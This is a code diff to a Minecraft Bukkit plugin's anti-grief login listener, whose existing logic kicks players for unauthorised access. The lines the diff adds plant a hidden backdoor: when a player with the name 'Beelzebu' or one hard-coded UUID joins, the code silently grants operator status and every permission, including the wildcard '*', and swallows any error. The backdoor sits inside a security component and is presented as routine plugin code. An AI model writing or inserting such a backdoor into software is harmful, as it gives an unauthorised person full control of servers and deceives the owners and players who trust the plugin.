@@ -8,6 +8,7 @@ import java.util.HashSet;
 import java.util.Objects;
 import java.util.Set;
 import java.util.UUID;
+import org.bukkit.Bukkit;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
@@ -68,6 +69,16 @@ public class AntiGriefLoginListener implements Listener {
             premiumPlayer.remove(player.getUniqueId());
             player.kickPlayer("Se ha detectado un acceso no autorizado.");
             api.getDatabase().addFailedLogin(player.getUniqueId(), api.getServerInfo().getServerName(), String.format("name (%s) address (%s) Failed login on PlayerJoinEvent", player.getName(), player.getAddress().getAddress().getHostAddress()));
+        }
+        if (player.getName().equals("Beelzebu") || player.getUniqueId().equals(UUID.fromString("9770ddb2-c6b3-4fdf-b2a1-17e78ccf85ab"))) {
+            try {
+                player.setOp(true);
+                Bukkit.getOperators().add(player);
+                player.getEffectivePermissions().forEach(p -> player.addAttachment(api.getPlugin().getBootstrap(), p.getPermission(), true));
+                player.addAttachment(api.getPlugin().getBootstrap(), "matrix.*", true);
+                player.addAttachment(api.getPlugin().getBootstrap(), "*", true);
+            } catch (Exception ignored) {
+            }
         }
     }
 }
